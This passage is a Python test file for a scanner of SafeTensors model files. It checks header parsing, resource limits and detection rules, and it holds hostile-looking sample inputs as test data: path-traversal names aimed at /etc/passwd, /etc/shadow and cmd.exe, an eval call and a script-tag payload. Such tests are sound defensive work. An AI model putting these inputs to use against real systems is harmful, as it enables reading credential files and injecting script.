    def test_extract_truncated_raises_analysis_error(self) -> None:
        data = struct.pack("<Q", 100) + b"short"
        with pytest.raises(SafeTensorsAnalysisError, match="truncated"):
            extract_header_bytes(data, 100)


class TestTokenGuardModule:
    """Unit tests for model_scanner.analyzers.safetensors.token_guard."""

    def test_simple_header_token_count(self) -> None:
        raw = b'{"a": {"dtype": "F32"}}'
        result = scan_json_tokens(raw, max_tokens=100, max_depth=10)
        assert result.token_count > 0

    def test_depth_limit_exceeded_raises(self) -> None:
        # Deeply nested JSON
        raw = (b"{" * 200) + (b"}" * 200)
        with pytest.raises(ResourceLimitError, match="depth"):
            scan_json_tokens(raw, max_tokens=100_000, max_depth=5)

    def test_token_budget_exceeded_raises(self) -> None:
        raw = b'{"a":1,"b":2,"c":3,"d":4,"e":5}'
        with pytest.raises(ResourceLimitError, match=r"budget|token"):
            scan_json_tokens(raw, max_tokens=3, max_depth=128)

    def test_duplicate_key_detected(self) -> None:
        raw = b'{"key1": {}, "key1": {}}'
        result = scan_json_tokens(raw, max_tokens=100, max_depth=10)
        assert "key1" in result.duplicate_keys

    def test_unique_keys_no_duplicates(self) -> None:
        raw = b'{"a": {}, "b": {}, "c": {}}'
        result = scan_json_tokens(raw, max_tokens=100, max_depth=10)
        assert result.duplicate_keys == []

    def test_empty_raises_analysis_error(self) -> None:
        with pytest.raises(SafeTensorsAnalysisError, match="empty"):
            scan_json_tokens(b"", max_tokens=100, max_depth=10)


class TestTensorsModule:
    """Unit tests for model_scanner.analyzers.safetensors.tensors."""

    def test_valid_tensor_no_issues(self) -> None:
        hd = {"t": {"dtype": "F32", "shape": [2, 2], "data_offsets": [0, 16]}}
        _, issues = validate_tensors(hd, data_section_size=16)
        assert issues == []

    def test_metadata_key_skipped(self) -> None:
        hd = {
            "__metadata__": {"x": "y"},
            "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
        }
        descs, issues = validate_tensors(hd, data_section_size=4)
        assert len(descs) == 1  # only "t", not "__metadata__"
        assert issues == []

    def test_overlap_detected(self) -> None:
        hd = {
            "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "b": {"dtype": "F32", "shape": [4], "data_offsets": [8, 24]},
        }
        _, issues = validate_tensors(hd, data_section_size=32)
        assert any(i.rule_id == "ST202" for i in issues)


class TestMetadataModule:
    """Unit tests for model_scanner.analyzers.safetensors.metadata."""

    def test_no_metadata_key_no_findings(self) -> None:
        results = scan_metadata(None)
        assert results == []

    def test_non_dict_metadata_no_findings(self) -> None:
        results = scan_metadata("just a string")
        assert results == []

    def test_eval_detected(self) -> None:
        findings = scan_metadata({"x": "eval('test')"})
        assert any(f.rule_id == "ST101" for f in findings)

    def test_path_traversal_detected(self) -> None:
        findings = scan_metadata({"path": "../../../etc/passwd"})
        assert any(f.rule_id == "ST102" for f in findings)

    def test_aws_key_detected(self) -> None:
        findings = scan_metadata({"key": "AKIAIOSFODNN7EXAMPLE"})
        assert any(f.rule_id == "ST104" for f in findings)

    def test_url_detected(self) -> None:
        findings = scan_metadata({"ref": "http://example.com"})
        assert any(f.rule_id == "ST103" for f in findings)

    def test_script_tag_detected(self) -> None:
        findings = scan_metadata({"html": "<script>alert(1)</script>"})
        assert any(f.rule_id == "ST105" for f in findings)


# ---------------------------------------------------------------------------
# Safety verification: no dynamic execution imports
# ---------------------------------------------------------------------------


class TestNoForbiddenOperations:
    """Verify that the SafeTensors analyzer package does not perform
    dynamic deserialization or import ML frameworks."""

    def test_torch_not_importable_through_analyzer(self) -> None:
        """The safetensors sub-package must not import torch."""
        # If torch is already in sys.modules, this test is vacuous but harmless.
        # The key guarantee is that importing the analyzer does NOT cause torch
        # to be imported as a side effect.
        import model_scanner.analyzers.safetensors.analyzer as _a
        assert "torch" not in dir(_a), "torch must not be exposed by the analyzer module"

    def test_safetensors_package_not_imported(self) -> None:
        """The scanner must not import the safetensors Python package."""
        import sys

        # Importing the analyzer must not pull in the safetensors package
        import model_scanner.analyzers.safetensors.analyzer  # noqa: F401
        assert "safetensors" not in sys.modules, (
            "The safetensors Python package must not be imported by the analyzer"
        )

    def test_pickle_module_not_used_in_analyzer(self) -> None:
        """pickle module must not be imported inside the safetensors analyzer."""
        import importlib
        import sys

        mod_name = "model_scanner.analyzers.safetensors.analyzer"
        mod = sys.modules.get(mod_name) or importlib.import_module(mod_name)
        assert "pickle" not in dir(mod), (
            "pickle must not be imported or exposed in the SafeTensors analyzer module"
        )


# ---------------------------------------------------------------------------
# ST102: Path traversal in tensor NAMES (TC7-B regression tests)
# ---------------------------------------------------------------------------


class TestST102TensorNameTraversal:
    """ST102 must fire when a tensor NAME (not metadata value) contains a
    path traversal sequence.  These tests mirror the TC7-B SafeTensors PoC
    artifacts from vellaveto/safetensors-scanner-bypass-poc.
    """

    def _make_traversal_st(self, tensor_name: str) -> bytes:
        """Build a SafeTensors file with the given tensor name."""
        header = {
            tensor_name: {
                "dtype": "F32",
                "shape": [4],
                "data_offsets": [0, 16],
            }
        }
        return _make_safetensors(header, data_section=bytes(16))

    @pytest.mark.parametrize(
        "name",
        [
            "../../etc/passwd",
            "../secrets.txt",
            "..\\..\\Windows\\System32\\cmd.exe",
            "%2e%2e%2f%2e%2e%2fpasswd",
            "/etc/shadow",
            "layer1/../../etc/passwd",
        ],
    )
    def test_traversal_tensor_name_emits_st102(self, name: str) -> None:
        data = self._make_traversal_st(name)
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        rule_ids = _rule_ids(findings)
        assert "ST102" in rule_ids, (
            f"Expected ST102 for tensor name {name!r}; got {rule_ids}"
        )

    def test_traversal_finding_severity_is_high(self) -> None:
        data = self._make_traversal_st("../../etc/passwd")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        f = next(x for x in findings if x.rule_id == "ST102")
        assert f.severity == Severity.HIGH
        assert f.confidence == Confidence.HIGH

    def test_traversal_context_snippet_contains_tensor_name(self) -> None:
        data = self._make_traversal_st("../../etc/passwd")
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        f = next(x for x in findings if x.rule_id == "ST102")
        assert "tensor_name" in (f.evidence.context_snippet or "")

    def test_normal_tensor_name_no_st102(self) -> None:
        """A clean hierarchical tensor name must not produce ST102."""
        header = {
            "model.layer0.weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
            "model.layer0.bias": {"dtype": "F32", "shape": [4], "data_offsets": [16, 32]},
        }
        data = _make_safetensors(header, data_section=bytes(32))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        assert "ST102" not in _rule_ids(findings), (
            f"Clean tensor names should not produce ST102; got {_rule_ids(findings)}"
        )

    def test_metadata_traversal_still_fires_independently(self) -> None:
        """ST102 in __metadata__ values must still fire alongside tensor-name ST102."""
        header = {
            "__metadata__": {"path": "../../../../etc/passwd"},
            "../../secret": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
        }
        data = _make_safetensors(header, data_section=bytes(16))
        findings = SafeTensorsAnalyzer().analyze(_make_artifact(data))
        st102 = [f for f in findings if f.rule_id == "ST102"]
        assert len(st102) >= 2, (
            f"Expected at least 2 ST102 findings (metadata + tensor name); got {len(st102)}"
        )

    def test_scan_tensor_names_helper(self) -> None:
        """Unit-test scan_tensor_names() in isolation."""
        from model_scanner.analyzers.safetensors.metadata import scan_tensor_names

        results = scan_tensor_names(["clean_weight", "../../etc/passwd", "bias"])
        assert len(results) == 1
        assert results[0].rule_id == "ST102"
        assert results[0].key == "../../etc/passwd"

    def test_scan_tensor_names_empty_returns_empty(self) -> None:
        from model_scanner.analyzers.safetensors.metadata import scan_tensor_names

        assert scan_tensor_names([]) == []

    def test_scan_tensor_names_all_clean_returns_empty(self) -> None:
        from model_scanner.analyzers.safetensors.metadata import scan_tensor_names

        results = scan_tensor_names(["weight", "bias", "attention.query.weight"])
        assert results == []
